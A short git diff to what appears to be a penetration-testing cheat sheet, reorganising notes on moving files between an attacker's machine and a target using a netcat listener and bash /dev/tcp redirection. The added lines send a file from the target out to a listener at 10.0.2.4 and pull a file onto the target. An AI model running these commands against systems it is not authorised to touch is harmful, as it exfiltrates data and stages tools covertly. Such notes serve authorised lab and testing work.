@@ -443,15 +443,28 @@ Just reverse the above commands. The process is identical.
  ╚═╝ ╚═╝ ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 ```
 
-Listen for a file with netcat on your own machine:
+## Upload Files
+
+On your own machine listen for the file using netcat:
 ```bash
 nc -vlnp 4545 > outputfile.txt
 ```
 
-Upload a file on the target using `/dev/tcp/` and common bash tools:
-
+On the target machine upload the file using using `/dev/tcp/` :
 ```bash
 cat inputfile.txt > /dev/tcp/10.0.2.4/4545
+```
+
+## Download Files
+
+On your own machine start a listener with the file as input:
+```bash
+nc -vlnp 4545 -q 0 < sourcefile.txt
+```
+
+On the target download the file by connecting to the listener:
+```bash
+( cat </dev/tcp/127.0.0.1/4545 ) > targetfile.txt
 ```
 
 
